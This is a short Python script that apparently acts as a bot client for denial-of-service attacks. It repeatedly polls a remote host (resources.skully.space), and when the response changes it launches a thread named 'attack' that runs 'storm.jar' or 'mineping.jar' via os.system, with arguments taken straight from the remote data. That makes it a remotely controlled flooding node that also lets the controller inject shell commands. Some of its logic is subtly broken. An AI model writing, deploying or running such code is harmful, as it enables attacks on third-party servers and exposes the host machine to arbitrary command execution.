import urllib3, os, time, threading
while True:
    try:
        old = urllib3.PoolManager().request("GET", "https://resources.skully.space/mineping.jar").data
    except:
        old = 1
    time.sleep(1)
    try:
        new = urllib3.PoolManager().request("GET", "https://resources.skully.space/storm.jar").data
    except:
        new = 1
    if old != new:
        def attack():
            try:
                if ":" in new:
                    os.system("java -jar storm.jar " + str(new.decode("utf-8")))
                else: 
                    os.system("java -jar mineping.jar " + str(new.decode("utf-8")))
            except:
                pass 
        threading.Thread(target=attack).start()  